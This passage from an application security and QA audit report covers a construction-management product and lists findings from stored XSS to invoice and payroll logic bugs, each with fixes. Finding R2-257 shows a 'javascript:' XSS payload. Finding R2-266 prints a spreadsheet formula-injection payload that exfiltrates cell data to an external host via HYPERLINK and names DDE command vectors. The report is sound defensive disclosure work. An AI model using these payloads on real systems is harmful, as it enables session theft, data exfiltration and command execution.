# 🗂️ ROUND 5 BATCH 7 — Timesheets, Drawings, Custom Fields, DPR

## FINDING R2-257 — 🔴 CRITICAL: stored XSS — a timesheet's `file_url` accepts a `javascript:` URL and the Team Action page renders it as a clickable link

**Both halves verified.**

**Backend stores it.** `POST /apis/v3/team-schedule/timesheets` performs no scheme validation on
`file_url` (`team_schedule.py:139` assigns `payload.file_url` straight to the model). Live:

```
POST /team-schedule/timesheets {"file_url":"javascript:alert(document.domain)","file_name":"zz.pdf", …}
→ 201
GET  /team-schedule/timesheets?company_id=…&project_id=…
→ [{"id":"446db84c-…", "file_url":"javascript:alert(document.domain)", …}]
```

**Frontend renders it in an anchor.**
`frontend/src/app/c/[company_id]/d/team-action/page.tsx:944-945`:

```jsx
                        {ts.file_url && (
                          <a href={ts.file_url} target="_blank" rel="noreferrer" className="inline-flex items-center gap-1 text-[10px] text-primary hover:underline">
```

`rel="noreferrer"` and `target="_blank"` do nothing against a `javascript:` scheme. Any user who
clicks the attachment link on that timesheet row executes the payload **in the application's own
origin**, where the session JWT is held in `localStorage` under `access_token` (verified this session)
and is therefore readable by injected script. The value is supplied by whoever created the timesheet
and is displayed to everyone who views the Team Action page, which makes this **stored, cross-user
XSS**, not self-XSS.

The upload control that normally populates `file_url` (`tsFileUrl`, `:604`) does not constrain what
the API will accept — the API is the boundary that matters, and it accepts anything.

### Scope check — where this is and is not exploitable
The `drawings` module also stores an unvalidated `file_url` (a `javascript:` URL was accepted on a
revision, verified below in R2-259), **but it renders it with `<img src={activeRev.fileUrl}>`
(`drawings/page.tsx:398-399`), which does not execute `javascript:` URLs in any current browser.**
That one is a broken image and an uncontrolled outbound request, not script execution. Recording the
distinction so the fix is not mis-scoped and the drawings case is not over-claimed.

### Severity
🔴 CRITICAL. Stored XSS in an authenticated multi-tenant application, reachable by any user who can
create a timesheet, triggering on an ordinary click by any colleague.

### Fix
1. Validate the scheme server-side on **every** URL-bearing field — allow `https:` (and `http:` only
   if genuinely needed), reject everything else. Fields to cover: `team_schedule.file_url`,
   `drawings.file_url`, drawing revision `file_url`, `wastage.photo_urls`, `dpr.photos`,
   `todos.url`, and anything else that reaches an `href`.
2. Sanitise at render as defence in depth — a small `safeHref()` helper that returns `undefined`
   for any non-http(s) scheme, used by every `<a href={…}>` fed from server data.
3. Move the session token out of `localStorage` to an httpOnly cookie so an XSS cannot lift it. That
   is a larger change and should be tracked separately, but it is what turns this from "bad" into
   "account takeover".

## FINDING R2-258 — 🟠 HIGH: a one-hour typo in a timesheet is silently recorded as a 23-hour shift

`backend/app/routers/team_schedule.py:76-82`:

```python
def _compute_duration(start: Optional[datetime], end: Optional[datetime]) -> Optional[int]:
    if not start or not end:
        return None
    seconds = (end - start).total_seconds()
    if seconds < 0:
        seconds += 24 * 3600  # wrap-around past midnight
    return int(round(seconds / 60))
```

The wrap-around is a reasonable idea for a night shift. **It is applied without looking at the
dates**, and both timestamps carry full dates. Live:

```
start_time 2026-07-27T09:00:00Z   end_time 2026-07-27T08:00:00Z   →  duration_minutes: 1380
```

Both stamps are the **same calendar day**, so this cannot be a night shift — it is a transposition
(08:00 typed for 18:00, or start and end swapped). The product records **23 hours** of work. The
control case is correct (09:00 → 17:00 gives 480), so the arithmetic is right and only the guard is
wrong.

Consequences: labour hours, timesheet totals, and any cost or productivity figure derived from them
are inflated by up to 23 hours per mistyped row, and the error is invisible — 1,380 minutes is a
plausible-looking number in a database column.

### Fix
Only wrap when `end.date() > start.date()` is impossible *and* the row is explicitly marked a night
shift; otherwise reject `end <= start` on the same date with a 422. If night shifts must be
supported, require the caller to send the true end date rather than inferring it.

## FINDING R2-259 — 🟠 HIGH: a drawing revision's approval can be flipped back and forth indefinitely, and each flip erases who approved it

```
POST /drawings/{id}/revisions              → 200  approval_status "pending", approved_by null
POST /drawings/revisions/{rev}/approve  {"approval_status":"approved","approved_by":"331b67d5-…"}
                                           → 200  approval_status "approved", approved_by "331b67d5-…"
POST /drawings/revisions/{rev}/approve  {"approval_status":"rejected"}
                                           → 200  approval_status "rejected", approved_by null
```

Three defects in one endpoint:

1. **No terminal state.** An approved revision can be un-approved, re-approved, and flipped again,
   without limit, by anyone with access. For construction drawings this is the whole point of the
   artefact — "approved for construction" is what site teams build from, and here it is a mutable
   field.
2. **No audit trail.** The second call set `approved_by` back to `null`. There is no history table
   and no timestamp of the earlier approval, so after a flip there is **no record that the drawing
   was ever approved**, or by whom, or when.
3. **`approved_by` is caller-supplied** — `"331b67d5-…"` is a different member, accepted verbatim.
   Eighth site of the caller-supplied identity pattern.

### Fix
Make approval append-only: write a `drawing_revision_approvals` row per decision (actor from the
authenticated user, timestamp, status, comment), derive the current status from the latest row, and
refuse to change an `approved` revision — superseding it requires a new revision, which is what
version codes are for.

## FINDING R2-260 — 🟠 HIGH: custom fields enforce nothing they promise — the type is ignored, the required flag is ignored, and values attach to records that do not exist

A field was defined as `field_type: "number"`, `is_required: true`, on `entity_type: "bill"`:

```
POST /custom-fields/fields {"field_name":"zz_r5_num","field_type":"number","is_required":true,"entity_type":"bill"}
→ 201 id ee30aecb-…
```

Three separate promises are then broken:

**(a) The declared type is not enforced.** A text value was stored on the number field:
```
POST /custom-fields/values {"field_id":"ee30aecb-…","value_text":"not a number at all", …}
→ 201 {"value_text":"not a number at all","value_number":null, …}
```
The schema has four typed slots (`value_text`, `value_number`, `value_date`, `value_json`) and
accepts whichever the caller fills, without checking it against `field_type`. Every consumer that
reads `value_number` for a "number" field gets `null`; every export that assumes the declared type
gets a surprise.

**(b) `entity_id` is not validated.** The value above was attached to
`entity_id: 00000000-0000-0000-0000-000000000000` — a bill that does not exist. There is no FK and no
existence check, so custom-field values can be orphaned at birth, and nothing will ever clean them up
(R2-177: nothing is deletable).

**(c) `is_required` is not enforced anywhere.** With the required field in place, a bill was created
carrying no custom fields at all:
```
POST /billing/bills {"invoice_number":"ZZ-R5-CF-1", …}   (no custom_fields key)
→ 201
```
So `is_required` is a label in the settings screen with no effect on any write path. A customer who
configures a mandatory field — a cost centre, a PO reference, a client code — will believe it is
enforced and discover months later that it is blank on most records.

### Fix
Validate the value against `field_type` at write time and populate the matching typed column; verify
`entity_id` exists and belongs to `company_id`; and enforce `is_required` in the create/update path of
every entity that declares custom fields, returning a 422 that names the missing field.

## FINDING R2-261 — 🟡 MEDIUM: a project can have any number of Daily Progress Reports for the same day

```
POST /dpr {"dpr_date":"2026-07-27","executed_qty":5}      → 201
POST /dpr {"dpr_date":"2026-07-27","executed_qty":7777}   → 201
GET  /dpr?project_id=…
→ 2026-07-27T00:00:00Z  5.0
  2026-07-27T00:00:00Z  7777.0
```

Two "daily" reports for the same project on the same date, with contradictory quantities and no
constraint, no warning, and no way to tell which one is authoritative. Any cumulative
progress-to-date figure sums both.

The name of the artefact is its specification: one per project per day. Add a unique constraint on
`(project_id, dpr_date)` and make the second submission an update (or an explicit revision) rather
than a second row.

R2-236. Four minutes were spent believing the timesheet endpoint was universally broken. **This is
exactly why R2-236's fix (a catch-all that returns a diagnosable JSON error through the CORS
middleware) is worth more than its own severity suggests** — it is a force multiplier on every future
investigation, by the founder as much as by an auditor.

# ⏱️ ROUND 5 BATCH 8 — Attendance, Labour, Depreciation, Files

## FINDING R2-262 — 🔴 CRITICAL: punching out always fails with a 500, which leaves the attendance record open forever and locks the worker out of attendance for the rest of the day

**R2-210 is confirmed live, its mechanism identified, and its blast radius is larger than recorded.**

```
POST /hr/attendance/punch {"punch_type":"in",  …}  → 201  punch_in set, hours_worked null
POST /hr/attendance/punch {"punch_type":"out", …}  → 500 Internal Server Error
POST /hr/attendance/punch {"punch_type":"in",  …}  → 400 "Already punched in today. Use punch_type='out'."
POST /hr/attendance/punch {"punch_type":"out", …}  → 500 Internal Server Error
GET  /hr/attendance/{project_id}/2026-07-27
→ [{"punch_in":"2026-07-27T06:21:04Z", "punch_out":null, "hours_worked":null, "status":"Present", …}]
```

**This is a deadlock.** Punch-out fails; punch-in is refused because a punch-in already exists. The
worker cannot record leaving site, cannot re-record arriving, and the row stays open permanently with
`hours_worked: null`. There is no recovery path in the product — per R2-177 the record cannot be
deleted either.

### Mechanism
`backend/app/routers/hr.py:331-347`:

```python
        now = datetime.utcnow()
        log.punch_out = now
        ...
        if log.punch_in:
            delta = (now - log.punch_in).total_seconds() / 3600
            log.hours_worked = Decimal(str(round(delta, 2)))
```

`datetime.utcnow()` is **naive**; `log.punch_in` was loaded from a `timezone=True` column and is
**aware**. `now - log.punch_in` raises `TypeError: can't subtract offset-naive and offset-aware
datetimes` on every punch-out, unconditionally. The identical bug to **R2-244** (`finance.py:416`),
in a different module — **the eighth known site of the R2-222 class**, and the third proven this
round to take a whole feature offline.

`today_start = datetime.utcnow().replace(...)` at `:290` is the same naive value used as a query
bound, which is a second, subtler instance in the same function.

### Blast radius — this one bug explains four other findings
Because `hours_worked` is **never written by any code path that succeeds**:

- **R2-203 / R2-252** — the LTIF denominator falls back to the hardcoded 10,000 manhours
  (`safety.py:162`), because `manhours_from_attendance` can never be true. Confirmed live in batch 6:
  `"manhours_source":"fallback"`.
- **R2-201** — payroll pays a full month against zero attendance, because attendance hours do not
  exist to contradict it.
- **Seeding step 4 of the Round 4 handoff** ("run payroll with real attendance") is not merely
  awkward, it is **impossible through the product**. Only a direct DB write can create
  `hours_worked`, which is what the Round 4 recipe already worked around.
- Any productivity, cost-per-hour or overtime figure derived from attendance is structurally null.

### Severity
🔴 CRITICAL, upgraded from R2-210's original filing. A site attendance system in which nobody can
ever clock out is not degraded, it is non-functional, and it silently invalidates payroll and
statutory safety reporting downstream.

### Fix
`datetime.now(timezone.utc)` at `:331` and `:290`. That single change restores punch-out, unblocks
`hours_worked`, and makes the attendance branch of LTIF reachable for the first time. Then add a
repair path for rows already stranded open — there is at least one on the audit project now
(`d3242f75-…`, employee `0057179f-…`, 2026-07-27), and there are almost certainly more in production
since this has been failing for the entire life of the feature.

## FINDING R2-263 — 🟠 HIGH: a muster roll accepts 240 hours worked by zero workers

```
POST /labour/muster-roll {"workers_present":0,"workers_absent":10,"hours_worked":240,"overtime_hours":100}
→ 201 {"workers_present":0,"workers_absent":10,"hours_worked":240.0,"overtime_hours":100.0}
```

**Nobody attended, and 240 regular hours plus 100 overtime hours were recorded.** The three fields
describe one fact — how much labour happened that day — and the product never compares them. A
plausible bound is `hours_worked <= workers_present × 24`; here `workers_present` is zero, so any
positive number of hours is impossible.

The muster roll is a **statutory register** under Indian labour law, produced for inspection. A
register that accepts internally contradictory rows cannot serve that purpose, and the contradiction
is not visible on the row itself unless a reader happens to check the arithmetic.

### Fix
Reject `hours_worked > workers_present * 24` and `overtime_hours > hours_worked`; require
`workers_present > 0` when any hours are logged. Same for the BOCW register, whose
`workers_count` / `wages_paid` pair has the same shape.

## FINDING R2-264 — 🟠 HIGH: subcontractor attendance bills overtime and allowances for zero workers, at any shift multiplier

```
POST /subcon/attendance {"worker_count":0,"shift_multiplier":10,"overtime_hours":99,"allowance":5000,"deduction":0}
→ 201 {"worker_count":0,"shift_multiplier":10.0,"overtime_hours":99.0,"allowance":5000.0}
```

Zero workers, 99 hours of overtime, a **×10 shift multiplier**, and ₹5,000 of allowance. Every field
was accepted without reference to any other.

`shift_multiplier` is the more dangerous of the two: it is a direct multiplier on subcontractor
labour cost with no upper bound. Legitimate values are 1.0, 1.5 or 2.0 (normal, overtime, double
shift). A value of 10 — or 1000 — is accepted, and combined with R2-253 (no comparison between a
subcon bill and its work order) there is no downstream control that would catch the resulting cost.

### Fix
Bound `shift_multiplier` (e.g. `ge=0.5, le=3.0`, or a configured set), require `worker_count > 0`
whenever `overtime_hours` or `allowance` is non-zero, and bound `overtime_hours` per worker per day.

## FINDING R2-265 — 🟠 HIGH: depreciation is not calculated — every figure is supplied by the caller, none are reconciled, and the schedule's own rate contradicts the asset's useful life

**(a) The entry accepts arbitrary, mutually contradictory numbers.**

```
POST /assets/entries {"depreciation_amount":1000,"accumulated_depreciation":999999,"book_value":888888}
→ 201, all three stored verbatim
```

`depreciation_amount`, `accumulated_depreciation` and `book_value` are **required inputs**, not
computed outputs. Nothing checks that `book_value = cost − accumulated_depreciation`, that
`accumulated_depreciation` is non-decreasing, or that either bears any relation to the schedule the
entry cites. The asset in question (`ZZ R5 Excavator`) has no recorded purchase cost at all, yet
carries a book value of ₹8,88,888.

Depreciation is a **computed** quantity — that is the entire content of the concept. A depreciation
ledger whose figures are typed in by the client is a free-text notes field with a numeric type.

**(b) The schedule is captured and never applied.** A schedule was created with `method: "SLM"`,
`useful_life_years: 5`. Nothing generates entries from it; the entry above was accepted with values
unrelated to it. Seventh member of the **"captured but never consumed"** pattern (BOQ revisions,
wastage, depreciation, to-do recurrence, recipe `wastage_pct`, equipment maintenance, this).

**(c) The default rate contradicts the useful life.** `assets.py:21`:

```python
    depreciation_pct: float = Field(10.0, ge=0, le=100)
```

A flat 10% default, independent of `useful_life_years`. The schedule created above returned
`{"useful_life_years": 5, "depreciation_pct": 10.0}` — under straight-line, a five-year life is
**20%** per year. The record asserts both that the asset is written off in five years and that it
loses 10% a year, which takes ten. Two fields describing one thing, never reconciled.

### Fix
Derive `depreciation_pct` from `useful_life_years` and `method` rather than defaulting it; compute
entries server-side from the schedule on a scheduled job or on demand; and make
`depreciation_amount` / `accumulated_depreciation` / `book_value` response-only fields.

The plumbing is sound — correct MIME types, correct `content-disposition`, sensible filenames, and

## FINDING R2-266 — 🔴 CRITICAL: CSV formula injection — free text typed into the product is written into exports unescaped, and executes when the file is opened in Excel, LibreOffice or Google Sheets

A DPR was created with a spreadsheet formula in its `notes` field. The export writes it out verbatim:

```
POST /dpr {"notes":"=HYPERLINK(\"https://zz.example/?d=\"&A1,\"ZZ CLICK\")", …}   → 201

GET /dpr/export?project_id=…
Date,Project,Author,Executed Qty,Work Done,Labour Count,Materials,Remarks,Status
2026-07-26,ZZ QA R5 Second Project,7f6c0bcf-…,1.0,"=HYPERLINK(""https://zz.example/?d=""&A1,""ZZ CLICK"")",0,,,submitted
```

The cell is correctly **quoted** — and quoting is exactly what does not help. RFC 4180 quoting
protects the CSV parser; it does not stop a spreadsheet from treating a leading `=` as a formula. On
open, Excel, LibreOffice Calc and Google Sheets all evaluate the cell.

`=HYPERLINK(...&A1, ...)` was chosen as a deliberately safe demonstration: it builds a link
containing the contents of a neighbouring cell, so a single click exfiltrates data from the same
spreadsheet to an external server. The same vector accepts `=WEBSERVICE(...)` (fetches on open in
older Excel), and `=cmd|'/c …'!A1` (DDE, still reachable in some configurations with a warning
prompt). The leading characters that must be neutralised are `=`, `+`, `-`, `@`, tab and carriage
return.

### Why this rates CRITICAL here specifically
- **The attacker only needs to be able to type.** A DPR note, a remark, a party name — any free-text
  field that reaches an export. Site staff, subcontractors, anyone with write access.
- **The victim is deliberately outside the app.** Exports exist to be emailed to clients, auditors,
  banks and government offices. The payload leaves the product's own security boundary and lands in
  the recipient's spreadsheet, on their machine.
- **It is not limited to DPR.** The payslip CSV is produced by the same pattern and carries employee
  names and designations, both free text. Any CSV export of user-entered data is affected.

### Fix
Prefix any cell whose first character is one of `= + - @ \t \r` with a single quote (`'`), or wrap it
as `="…"` with internal quotes doubled — applied in **one shared CSV-writing helper** used by every
export, not per endpoint. Add a test that round-trips a `=1+1` note and asserts the output cell is
inert. Consider offering `.xlsx` instead, where values can be written as explicit strings.

### Auditor disclosure
The proof-of-concept DPR is `c36fd7d1-fa70-415c-8c9c-de81a6e8721e` (project `ZZ QA R5 Second
Project`, dated 2026-07-26). **There is no `DELETE /dpr/{id}` endpoint** — the DPR router exposes only
`POST /dpr`, `GET /dpr`, `GET /dpr/export` and `GET /dpr/summary` — so unlike the timesheet payload in
R2-257 this one **cannot be removed through the product** (R2-177 again). It is inert unless the CSV
is opened and the link clicked, and it points at `zz.example`, which does not resolve. **It should be
deleted from the database.**

## FINDING R2-267 — 🟠 HIGH: the Tally export books customer receipts as purchases, so money received becomes a payable in the statutory books of account

Every bill in the company is emitted as a Tally voucher. The voucher type is derived from the bill,
and the four `SETTLEMENT_INVOICE_TYPES` are not distinguished from cost. From the generated XML:

```
ZZ-R5-PUR-1      Purchase   amounts=['11800.00', '-11800.00']
ZZ-R5-EQP-1      Purchase   amounts=['23600.00', '-23600.00']
ZZ-R5-EXP-1      Purchase   amounts=['35400.00', '-35400.00']
ZZ-R5-PMTIN      Purchase   amounts=['590.00', '-590.00']      ← invoice_type "payment_in"
ZZ-R5-SUB-1      Purchase   amounts=['590000.00', '-590000.00']
```

`ZZ-R5-PMTIN` is a **payment_in** voucher — money received. It is exported to Tally as a **Purchase**,
which in Tally creates a payable to the party. The company's accounting system is told it owes ₹590
to a party that in fact paid it ₹590.

This is the same root cause as **R2-238** (the ledger books settlement vouchers as Material Cost),
reappearing in the accounting export. It is more serious here because Tally is the **statutory book of
account** — the numbers that go to the auditor and the tax return — whereas the ledger screen is
internal. Overall the export contains 12 `Purchase`, 2 `Receipt` and 1 `Sales` voucher, so the voucher
type is being derived from something other than a complete `invoice_type` mapping.

Seventh site in the `invoice_type` cross-cutting pattern (R2-153, R2-229, R2-036, R2-081, R2-238,
R2-250, this). The shared cost-head mapping proposed in the Round 5 handoff must include a
**settlement** class that the Tally exporter maps to `Receipt` / `Payment` voucher types.

Worth noting: the Tally exporter is also the **only** consumer in the product that filters
`Bill.status != "Cancelled"` (`tally.py:514,550`, R2-232). Someone thought carefully about this
module's correctness in one respect and missed the voucher-type mapping in another.

## FINDING R2-268 — 🟡 MEDIUM: the DPR export identifies the author by raw UUID

```
Date,Project,Author,Executed Qty,…
2026-07-27,ZZ QA R5 Second Project,7f6c0bcf-fb15-4de1-b1ad-9acbfc02c7a1,5.0,…
```

The Daily Progress Report is a document sent to clients and consultants. Its `Author` column contains
a 36-character database identifier instead of a person's name. Every other column is
human-readable — the project name is resolved correctly in the adjacent column, so the join is
available and simply was not done for this field.

### Fix
Resolve `reported_by` to the user's name, as `/finance/ledger` already does for party ids, and fall
back to `"Unknown"` rather than leaking an internal identifier into a client-facing document.

## FINDING R2-269 — 🟡 MEDIUM: the payslip export contains no employee identifier, so employees with the same name produce indistinguishable rows

```
Employee Name,Designation,Days Present,Days In Month,Gross,…,Net Pay
ZZ QA Employee One,Site Engineer,7.0,26,6300.0,…,5718.46
ZZ QA Employee One,Site Engineer,7.0,26,6300.0,…,5718.46
ZZ QA Verify Employee,QA,26.0,26,23400.0,…,21240.0
```

The two identical rows are **two different employees** — `employee_id` `0057179f-…` and
`050116b0-…` — who happen to share a name. Nothing in the exported file distinguishes them. A payroll
clerk reconciling this against bank transfers sees what looks like a duplicated line and has no way to
tell whether it is an error or two real people.

The export has no employee code, no id, and no other discriminator, and the product does not enforce
uniqueness on employee name. Names genuinely repeat on Indian construction sites, so this will occur
in production without any audit data involved.

### Fix
Add an `Employee Code` (or id) column to the payslip export, and to every export that names a person.
Separately, consider a uniqueness constraint on employee code within a company.

*(The duplicate employee records here were created by earlier audit rounds. The export defect is
independent of them — it is the absence of a column, not the presence of duplicates.)*

# 🧩 ROUND 5 BATCH 10 — Chat, the invoice PDF, CRM

## FINDING R2-270 — 🔴 CRITICAL: creating a chat group from the console always fails — the UI sends a `users.id` into a column that references `company_team`

`ChatGroup.created_by` is declared at `models.py:1633`:

```python
    created_by = Column(UUID(as_uuid=True), ForeignKey("company_team.id"), nullable=True)
```

The chat page sends the logged-in **user** id, `frontend/src/app/c/[company_id]/d/chat/page.tsx:162`:

```js
          created_by: currentLoggedUserId,
```

A `users.id` is not a `company_team.id`, so Postgres rejects the insert and the request dies with an
unhandled `IntegrityError`.

### Reproduced live, both ways
```
POST /chat/groups {"name":"ZZ R5 Chat","created_by":"7f6c0bcf-…"}   → 500 Internal Server Error
POST /chat/groups {"name":"ZZ R5 Chat 2"}   (no created_by)         → 201, created_by: null
```

The only difference is the field the UI always populates. **Every "create group" click in the product
fails**, and the second call proves the rest of the handler is fine.

### It has been failing in production and is on the Sentry board right now
The Sentry issue stream carries, aged ~8 hours at the time of writing:

```
IntegrityError — (psycopg2.errors.ForeignKeyViolation) insert or update on table "chat_groups"
violates foreign key constraint "chat_groups_created_by_fkey"
DETAIL: Key (created_by)=(7f6c0bcf-fb15-4de1-b1ad-9acbfc02c7a1) is not present in table "company_team".
… 'name': 'ZZ QA Audit Chat' …
PYTHON-FASTAPI-D  Unhandled  /apis/v3/chat/groups
```

That is the same user id and the same failure, from an earlier round of this audit. **The evidence has
been sitting on the board, correctly captured, unread.** Contrast R2-236, where a reproducible 500
never reached Sentry at all: the monitoring is not uniformly blind, it is unwatched in some places and
blind in others.

### Same class as R2-231
This is the second confirmed **id-shape mismatch between frontend and backend** found this round. In
R2-231 the Finance page omits `party_company_user_id` entirely and the payment silently does nothing;
here the chat page supplies the wrong kind of id and the request loudly fails. Both stem from several
different id types — `users.id`, `company_team.id`, `library_parties.id` — being passed as bare UUIDs
with no type distinction anywhere in the stack. A third instance was nearly filed as a product bug
this session before being traced to the auditor's own call (see batch 7's near-miss note).

### Fix
1. Set `created_by` server-side from the authenticated user's `company_team` row and remove it from
   the request schema — this also closes another site of the caller-supplied identity pattern.
2. Add the catch-all handler from R2-236 so an `IntegrityError` returns a diagnosable 4xx instead of a
   bare 500.
3. Consider distinct typed wrappers (or at minimum consistent field naming: `*_user_id` vs
   `*_team_id` vs `*_party_id`) so this class of mistake is visible at the call site.

## FINDING R2-271 — 🔴 CRITICAL: the invoice PDF's line items and its totals are never reconciled — a ₹10 line item is printed on a ₹1,00,000 invoice

`subtotal` is a required top-level field on a bill, and `items_json` is an unrelated optional field.
Nothing compares them. The generated tax invoice therefore contradicts itself on its face.

**Proved live.** A sales invoice was created with one line item worth ₹10 and a subtotal of
₹1,00,000. The PDF the customer would receive, in full:

```
AK Construction
Sales Invoice
Party: upadhyayprateek574
Invoice No: ZZ-R5-MISMATCH        Invoice Date: 2026-07-27
Type: Sales Invoice               Status: Unpaid

Description                          Qty    Rate    Amount
ZZ item A                            1      10      10

SUMMARY / TOTALS
Subtotal: 100000.00
GST Amount: 18000.00
Total Payable: 118000.00
Paid Amount: 0.00
```

The itemisation says ₹10. The total says ₹1,18,000. **Both numbers are printed on the same page.**

A second bill was created with **no items at all** and a ₹5,00,000 subtotal; its PDF renders the
column headers and then nothing, above a `Total Payable: 590000.00`. So the product will also issue an
invoice for ₹5.9 lakh that itemises nothing.

### Why CRITICAL
This is the document the customer sends to its client to get paid, and the one the client's auditor
and the tax authority will read. An invoice whose line items do not sum to its total is not a
disputed number, it is an invalid document — and in a GST regime, the itemisation and the tax base are
what the return is built from. The defect is silent: both figures render cleanly, and the person
generating the PDF has no reason to add up the column.

### Fix
1. Compute `subtotal` from `items_json` server-side and reject a supplied subtotal that disagrees
   beyond a rounding epsilon; or make `subtotal` response-only.
2. Refuse to render a PDF for a bill with no line items, or print an explicit
   "No itemisation recorded" line rather than an empty table under a large total.
3. Add a test asserting `sum(item.amount) == subtotal` for every bill that has items.

## FINDING R2-272 — 🟠 HIGH: the invoice PDF omits the party for some members and carries none of the fields an Indian tax invoice requires

**(a) The party is missing.** The PDF for the ₹5,90,000 subcontractor bill renders:

```
Party: N/A
```

The bill has a valid `party_company_user_id` (`331b67d5-…`), and that same id resolves to a real name
in other surfaces. Party resolution succeeded on the second test bill (`Party: upadhyayprateek574`,
party `e9db5738-…`) and failed on the first, so the lookup works for some `company_team` rows and not
others — the same inconsistency as the work order's `subcontractor_name: "Unknown"` noted under
R2-253. **An invoice that does not name the party it is addressed to cannot be sent.**

**(b) The document lacks the statutory fields.** The complete text of the rendered invoice is quoted
under R2-271. It contains a company name, an invoice number and date, a type, a status, a
description table, and four totals. It does **not** contain: the supplier's GSTIN, the recipient's
GSTIN, the place of supply, the HSN/SAC code per line, the CGST/SGST/IGST split (only a combined "GST
Amount"), or the words "Tax Invoice". Those are the fields an Indian GST tax invoice is required to
carry, and the product stores several of them already — `LibraryParty.tax_no` holds the party GSTIN
(it is read by the Zoho integration at `zoho_books.py:566-570`), and library materials have an
`hsn_sac` field.

I am flagging the gap, not opining on the customer's legal exposure. The practical point stands on its
own: the data is in the database, the template does not print it, and a construction company cannot
issue this document to a client and claim input credit against it.

### Fix
Print the supplier and recipient GSTIN, place of supply, per-line HSN/SAC, and the CGST/SGST/IGST
split derived from the place of supply; title the document "Tax Invoice". Fix the party lookup, and
fail loudly rather than printing `N/A` on a financial document.

## FINDING R2-273 — 🟡 MEDIUM: CRM leads accept a phone number that is not a phone number and an email that is not an email

```
POST /crm/leads {"contact_name":"ZZ R5 Lead","phone_no":"not-a-phone","email":"not-an-email",
                 "budget":50000,"expected_closure":"2020-01-01"}
→ 201 {"phone_no":"not-a-phone","country_code":"+91","email":"not-an-email", …}
```

`phone_no` is the one field a sales lead exists for, and it is unvalidated free text. `email` has no
format check despite Pydantic's `EmailStr` being one import away. `expected_closure` accepts a date
six years in the past, so a lead can be created already overdue — the same shape as the NCR due date
in R2-246 and the safety `reported_at` in R2-256.

Another instance of the corrected thesis from Amendment 2: **numeric validation is good, string
validation is absent.** The same request had `budget: -50000` correctly rejected with
`greater_than_equal / ge: 0.0` — the numeric guard fired, the two string guards do not exist.

### Fix
`EmailStr` for `email`; a phone pattern appropriate to `country_code`; and reject an
`expected_closure` in the past on creation.

# 📐 ROUND 5 BATCH 11 — BOQ, drawing pins, to-dos, subcon scorecards

The last of the unexercised modules.

## FINDING R2-274 — 🟠 HIGH: a BOQ revision is recorded, changes nothing, and does not even record what changed

The cross-cutting note "captured but never consumed" has listed BOQ revisions since Round 3 without a
measurement. Here is one.

```
POST /budgeting/boq-documents/{id}/revisions {"revised_amount":750000,"reason":"ZZ R5 variation order"}
→ 201 {"revision_no":1, "revised_amount":750000.0,
       "previous_amount":null, "delta":null,
       "revised_by_user_id":"7f6c0bcf-…","revised_by_name":"upadhy…"}

GET /budgeting/boq-documents?project_id=…
→ [{"title":"ZZ R5 BOQ","boq_value":0.0,"billed_value":0.0,"physical_progress":0.0,"item_count":0}]
```

A ₹7,50,000 variation order was accepted and **`boq_value` remained 0.00**. The revision is a row in a
side table that no consumer reads: not the BOQ document, not Budget, not the P&L, not the BOQ PDF.

Worse, the revision record is **not even self-describing**. `previous_amount` and `delta` both come
back `null`, so the row cannot answer "what did this change?" — the one question a revision history
exists to answer. A variation-order trail with no before-value and no delta is not an audit trail.

On a construction project, variation orders are frequently a large fraction of final contract value.
A BOQ module that accepts them and ignores them means the contract value on screen drifts away from
the real one with every variation, silently.

### Fix
Apply the revision to `boq_document.boq_value` inside the same transaction, populate
`previous_amount` and `delta` from the value being replaced, and surface the revision history on the
BOQ screen and in the BOQ PDF. Then re-check Budget and P&L, which read BOQ values.

### Recorded as correct in the same endpoint
`revised_by_user_id` and `revised_by_name` are **derived server-side from the authenticated user** —
they are not in the request schema. This is the **first counter-example** to the caller-supplied
identity pattern found in the product (nine sites of the defect so far). Whoever wrote this endpoint
did it correctly; it is the model the other eight should copy.

## FINDING R2-275 — 🟠 HIGH: a BOQ can report 99 of 5 milestones complete, and the contradiction is printed on the client-facing PDF

```
POST /budgeting/boq-documents {"title":"ZZ R5 BOQ","milestone_done":99,"milestone_total":5}
→ 201 {"milestone_done":99,"milestone_total":5, …}
```

`milestone_done` is never checked against `milestone_total`. The pair then flows straight into the
generated document — the full text of the BOQ PDF:

```
AK Construction
Generated on: 2026-07-27 06:40:58 UTC
Client: N/A
Title: ZZ R5 BOQ
Milestones: 99 / 5

Section    Item    Unit    Qty    Rate    Amount

SUMMARY / TOTALS
BOQ Value: 0.00
Line Items: 0
```

**"Milestones: 99 / 5"** on a document sent to a client. Any percentage-complete figure derived from
the pair is 1,980%.

Note also `Client: N/A` — the same party-resolution failure as R2-272, here on a second document type
(see R2-276).

### Fix
Reject `milestone_done > milestone_total`, and clamp on render as defence in depth. The same
relational check belongs on every `done / total` pair in the product.

## FINDING R2-276 — 🟠 HIGH: party names fail to resolve on three separate surfaces, each with a different placeholder, for ids that resolve correctly elsewhere

The same underlying failure, found independently in three modules this round:

| Surface | Output | Party id |
|---|---|---|
| Work order response (`/billing/work-orders`) | `"subcontractor_name": "Unknown"` | `331b67d5-…` |
| Invoice PDF (`/billing/bills/{id}/pdf`) | `Party: N/A` | `331b67d5-…` |
| Subcon scorecard (`/subcon/scorecards/recompute`) | `"subcontractor_name": "Unknown"` | `331b67d5-…` |
| BOQ PDF (`/budgeting/boq-documents/{id}/pdf`) | `Client: N/A` | (unset) |

The id is a real `company_team` row. It **does** resolve elsewhere — `/finance/ledger` prints a real
name for party ids, and the invoice PDF for a different party (`e9db5738-…`) rendered
`Party: upadhyayprateek574` correctly. So the lookup works for some `company_team` rows and not
others, which points at a join that only succeeds when the team row has a populated `user_id`
(the same two-hop `CompanyTeam → User` walk that `finance.py:266-271` performs, where every step is
guarded by `if` and silently falls through to a placeholder).

Three consequences:
1. **Documents go out unaddressed.** An invoice reading `Party: N/A` and a subcontractor scorecard
   reading `Unknown` cannot be sent to anyone.
2. **Three different placeholders** — `"Unknown"`, `"N/A"`, `null` — mean a consumer cannot even
   reliably detect the failure.
3. The silent fallback hides it. Every one of those `if` chains ends in a default rather than an
   error, so nothing is logged and nothing alerts.

### Fix
One shared `resolve_party_name(db, company_team_id)` used everywhere, returning a real name or raising
— and for parties that are organisations rather than users, resolve through `LibraryParty` instead of
`User`, which is likely the actual gap. Fail loudly on financial documents.

## FINDING R2-277 — 🟡 MEDIUM: a drawing pin placed outside the numeric column's range crashes with an unhandled 500, and the pin's `created_by` is a third instance of the untyped-id bug

Two independent 500s on the same endpoint, isolated by bisection:

```
POST /drawings/revisions/{id}/pins {"x_coordinate":10,"y_coordinate":10,"comment":"ZZ ok"}      → 200
